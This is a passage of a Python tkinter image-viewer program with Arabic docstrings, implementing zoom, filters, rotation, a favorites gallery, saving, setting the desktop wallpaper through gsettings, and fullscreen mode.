            self.display_image(self.current_pil_image)

    def zoom_out(self):
        """تصغير الصورة"""
        self.zoom_level = max(0.1, self.zoom_level - 0.2)
        if hasattr(self, "current_pil_image"):
            self.display_image(self.current_pil_image)

    def zoom_reset(self):
        """إعادة الحجم الأصلي"""
        self.zoom_level = 1.0
        if hasattr(self, "current_pil_image"):
            self.display_image(self.current_pil_image)

    def fit_to_window(self):
        """ملاءمة الصورة للنافذة"""
        self.zoom_level = 1.0
        if hasattr(self, "current_pil_image"):
            self.display_image(self.current_pil_image)

    def apply_blur(self):
        """تطبيق تأثير ضبابي"""
        if hasattr(self, "current_pil_image"):
            blurred = self.current_pil_image.filter(ImageFilter.GaussianBlur(radius=3))
            self.current_pil_image = blurred
            self.display_image(blurred)
            self.set_status("🎨 تم تطبيق تأثير ضبابي")

    def apply_enhance(self):
        """تحسين الألوان"""
        if hasattr(self, "current_pil_image"):
            enhancer = ImageEnhance.Color(self.current_pil_image)
            enhanced = enhancer.enhance(1.5)
            enhancer2 = ImageEnhance.Contrast(enhanced)
            enhanced2 = enhancer2.enhance(1.2)
            self.current_pil_image = enhanced2
            self.display_image(enhanced2)
            self.set_status("✨ تم تحسين الألوان")

    def rotate_image(self):
        """تدوير الصورة"""
        if hasattr(self, "current_pil_image"):
            rotated = self.current_pil_image.rotate(90, expand=True)
            self.current_pil_image = rotated
            self.display_image(rotated)
            self.set_status("🔄 تم تدوير الصورة")

    def flip_image(self):
        """قلب الصورة أفقياً"""
        if hasattr(self, "current_pil_image"):
            flipped = self.current_pil_image.transpose(Image.FLIP_LEFT_RIGHT)
            self.current_pil_image = flipped
            self.display_image(flipped)
            self.set_status("↔ تم قلب الصورة")

    # ═══════════════════════════════════════════════════════════
    #                    المفضلة والحفظ
    # ═══════════════════════════════════════════════════════════

    def toggle_favorite(self):
        """إضافة/إزالة من المفضلة"""
        if not self.filtered_images:
            return

        img_path = self.filtered_images[self.current_index]["path"]
        if img_path in self.favorites:
            self.favorites.discard(img_path)
            self.btn_fav.configure(text="🤍")
            self.set_status("💔 تم إزالة الصورة من المفضلة")
        else:
            self.favorites.add(img_path)
            self.btn_fav.configure(text="❤️")
            self.set_status("❤ تم إضافة الصورة للمفضلة!")

        self.update_stats()

    def remove_from_favorites(self):
        """إزالة من المفضلة"""
        if not self.filtered_images:
            return
        img_path = self.filtered_images[self.current_index]["path"]
        self.favorites.discard(img_path)
        self.btn_fav.configure(text="🤍")
        self.update_stats()

    def show_favorites_window(self):
        """عرض نافذة المفضلة"""
        if not self.favorites:
            messagebox.showinfo("المفضلة", "لا توجد صور في المفضلة بعد!\n\nاضغط ❤ لإضافة صور.")
            return

        fav_window = tk.Toplevel(self.root)
        fav_window.title("❤ المفضلة")
        fav_window.geometry("800x600")
        fav_window.configure(bg=COLORS["bg_dark"])

        tk.Label(
            fav_window,
            text=f"❤ المفضلة ({len(self.favorites)} صورة)",
            font=("Arial", 16, "bold"),
            bg=COLORS["bg_dark"],
            fg=COLORS["accent_rose"],
            pady=15,
        ).pack()

        # إطار قابل للتمرير
        canvas = tk.Canvas(fav_window, bg=COLORS["bg_dark"], highlightthickness=0)
        scrollbar = ttk.Scrollbar(fav_window, orient=tk.VERTICAL, command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=COLORS["bg_dark"])

        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all")),
        )

        canvas.create_window((0, 0), window=scrollable_frame, anchor=tk.NW)
        canvas.configure(yscrollcommand=scrollbar.set)

        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # عرض الصور المفضلة
        row_frame = None
        for i, img_path in enumerate(self.favorites):
            if i % 4 == 0:
                row_frame = tk.Frame(scrollable_frame, bg=COLORS["bg_dark"])
                row_frame.pack(fill=tk.X, padx=10, pady=5)

            try:
                img = Image.open(img_path)
                img.thumbnail((160, 140), Image.LANCZOS)
                img_tk = ImageTk.PhotoImage(img)

                frame = tk.Frame(row_frame, bg=COLORS["card_bg"], bd=2, relief=tk.FLAT)
                frame.pack(side=tk.LEFT, padx=5)

                btn = tk.Button(
                    frame,
                    image=img_tk,
                    command=lambda p=img_path: self.open_favorite(p, fav_window),
                    bg=COLORS["card_bg"],
                    relief=tk.FLAT,
                    cursor="hand2",
                )
                btn.image = img_tk
                btn.pack()

                name = Path(img_path).stem
                tk.Label(
                    frame,
                    text=name[:20],
                    font=("Arial", 8),
                    bg=COLORS["card_bg"],
                    fg=COLORS["text_gray"],
                ).pack()
            except:
                pass

    def open_favorite(self, img_path, window):
        """فتح صورة من المفضلة"""
        for i, img_data in enumerate(self.images_data):
            if img_data["path"] == img_path:
                self.filtered_images = self.images_data.copy()
                self.show_image(i)
                window.destroy()
                break

    def save_image(self):
        """حفظ الصورة الحالية"""
        if not hasattr(self, "current_pil_image"):
            return

        file_path = filedialog.asksaveasfilename(
            title="حفظ الصورة",
            defaultextension=".jpg",
            filetypes=[
                ("JPEG", "*.jpg"),
                ("PNG", "*.png"),
                ("BMP", "*.bmp"),
                ("الكل", "*.*"),
            ],
        )

        if file_path:
            try:
                self.current_pil_image.save(file_path)
                self.set_status(f"💾 تم حفظ الصورة: {Path(file_path).name}")
            except Exception as e:
                messagebox.showerror("خطأ", f"فشل الحفظ: {e}")

    def set_as_wallpaper(self):
        """تعيين الصورة كخلفية سطح المكتب"""
        if not self.filtered_images:
            return

        img_path = self.filtered_images[self.current_index]["path"]

        try:
            import subprocess
            # Linux
            subprocess.run(
                ["gsettings", "set", "org.gnome.desktop.background", "picture-uri",
                 f"file://{img_path}"],
                check=False,
            )
            self.set_status("🖨 تم تعيين الصورة كخلفية سطح المكتب!")
        except:
            messagebox.showinfo(
                "تعيين خلفية",
                f"مسار الصورة:\n{img_path}\n\nيمكنك تعيينها يدوياً كخلفية سطح المكتب."
            )

    # ═══════════════════════════════════════════════════════════
    #                    ملء الشاشة والأحداث
    # ═══════════════════════════════════════════════════════════

    def toggle_fullscreen(self, event=None):
        """تبديل وضع ملء الشاشة"""
        self.fullscreen_mode = not self.fullscreen_mode
        self.root.attributes("-fullscreen", self.fullscreen_mode)
        if self.fullscreen_mode:
            self.set_status("⛶ وضع ملء الشاشة - اضغط Escape للخروج")
        else:
            self.set_status("🔲 تم الخروج من وضع ملء الشاشة")

    def exit_fullscreen(self, event=None):
        """الخروج من وضع ملء الشاشة"""
        if self.fullscreen_mode:
            self.fullscreen_mode = False
            self.root.attributes("-fullscreen", False)

    def on_canvas_click(self, event):
        """حدث النقر على اللوحة"""
        pass

    def on_mousewheel(self, event):
        """حدث عجلة الماوس للتكبير"""
        if event.delta > 0:
            self.zoom_in()
        else:
            self.zoom_out()

    def on_canvas_resize(self, event):
        """حدث تغيير حجم اللوحة"""
        if hasattr(self, "current_pil_image"):
            self.root.after(100, lambda: self.display_image(self.current_pil_image))

    # ═══════════════════════════════════════════════════════════
    #                    الاقتباسات والحالة
    # ═══════════════════════════════════════════════════════════

    def start_quote_animation(self):
        """بدء تحريك الاقتباسات"""
        def change_quote():
            while True:
                time.sleep(8)
                quote = random.choice(QUOTES)
                self.root.after(0, lambda q=quote: self.quote_var.set(q))

        thread = threading.Thread(target=change_quote, daemon=True)
        thread.start()

    def set_status(self, message):
        """تحديث شريط الحالة"""
        self.status_var.set(message)

    def update_stats(self):
        """تحديث الإحصائيات"""
        self.stats_total.configure(text=f"إجمالي الصور: {len(self.images_data)}")
        self.stats_shown.configure(text=f"المعروضة: {len(self.filtered_images)}")
        self.stats_favorites.configure(text=f"المفضلة: {len(self.favorites)}")

    # ═══════════════════════════════════════════════════════════
    #                    إغلاق البرنامج
    # ═══════════════════════════════════════════════════════════

    def on_closing(self):
        """حدث إغلاق البرنامج"""
        self.slideshow_running = False
        self.save_settings()
        self.root.destroy()

    def run(self):
        """تشغيل البرنامج"""
        self.root.mainloop()


# ═══════════════════════════════════════════════════════════════
#                    نقطة البداية
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    if not PIL_AVAILABLE:
        print("⚠ مكتبة Pillow غير مثبتة! قم بتثبيتها: pip install pillow")
        sys.exit(1)

    app = WoroodAlHub()
    app.run()
